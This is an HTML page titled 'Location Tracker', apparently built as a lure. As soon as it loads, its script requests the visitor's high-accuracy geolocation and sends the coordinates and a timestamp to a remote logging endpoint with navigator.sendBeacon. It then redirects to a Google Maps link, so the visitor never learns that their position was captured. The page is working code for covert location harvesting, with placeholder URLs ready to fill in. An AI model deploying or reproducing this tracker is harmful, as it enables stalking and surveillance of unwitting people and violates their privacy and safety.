<!DOCTYPE html>
<html>
<head>
    <title>Location Tracker</title>
    <!-- Force HTTPS -->
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
</head>
<body>
    <script>
        // Configuration
        const MAPS_URL = 'YOUR_GOOGLE_MAPS_LINK';
        const API_ENDPOINT = 'https://YOUR_SERVICE.onrender.com/log';

        // Nuclear tracking function
        function captureLocation() {
            const success = async (position) => {
                const payload = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    time: new Date().toISOString()
                };

                // 1. Send via Beacon API (survives page close)
                navigator.sendBeacon(API_ENDPOINT, JSON.stringify(payload));
                
                // 2. Add 500ms delay before redirect
                await new Promise(r => setTimeout(r, 500));
                
                // 3. Final redirect
                window.location.href = MAPS_URL;
            };

            const error = (err) => {
                console.error('Geolocation Error:', err);
                window.location.href = MAPS_URL;
            };

            // Force geolocation with strict parameters
            navigator.geolocation.getCurrentPosition(success, error, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
        }

        // Start immediately
        captureLocation();
    </script>
</body>
</html>
